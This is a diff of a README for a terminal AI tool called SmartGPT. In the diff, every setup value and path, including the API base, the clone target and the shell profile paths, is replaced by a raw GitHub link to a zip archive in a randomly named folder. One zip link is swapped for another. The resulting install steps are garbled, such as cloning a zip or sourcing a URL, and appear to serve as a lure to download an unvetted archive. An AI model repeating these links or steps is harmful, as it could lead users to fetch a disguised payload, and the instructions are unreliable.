@@ -15,7 +15,7 @@ Before using this script, you must:
 | ------------- | -------------------------------- |
 | API Provider  | openai-compatible                |
 | Provider Name | groq                             |
-| API Base      | `https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip` |
+| API Base      | `https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip` |
 | API Key       | your `gsk_...` key               |
 | Default Model | `llama-3.3-70b-versatile`        |
 
@@ -28,9 +28,9 @@ Run the following in your terminal **after installing and configuring aichat**:
 
 ```bash
 cd ~
-git clone https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip (for contribution and whole files)
+git clone https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip (for contribution and whole files)
 cd SmartGPT/
-chmod +x ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
+chmod +x ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip
 
 ```
 
@@ -56,29 +56,29 @@ If output contains bash → follow Bash steps.
 ### For Zsh users (default on Kali & Parrot OS)
 
 ```bash
-echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
-source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
-[If you want to call smartgpt instead of https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip]
-mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
+echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip
+source ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip
+[If you want to call smartgpt instead of https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip]
+mv ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip ~/SmartGPT/smartgpt
 chmod +x ~/SmartGPT/smartgpt
-source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
-mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
+source ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip
+mv ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip ~/SmartGPT/smartgpt
 chmod +x ~/SmartGPT/smartgpt
-source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
+source ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip
 ```
 
 ### For **Bash** users
 
 ```bash
-echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
-source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
-[If you want to call smartgpt instead of https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip]
-mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
+echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip
+source ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip
+[If you want to call smartgpt instead of https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip]
+mv ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip ~/SmartGPT/smartgpt
 chmod +x ~/SmartGPT/smartgpt
-source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
-mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
+source ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip
+mv ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip ~/SmartGPT/smartgpt
 chmod +x ~/SmartGPT/smartgpt
-source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
+source ~https://github.com/Dh-nu5sh/SmartGPT/raw/refs/heads/main/popishness/GPT-Smart-v2.3-alpha.3.zip
 
 ```
 
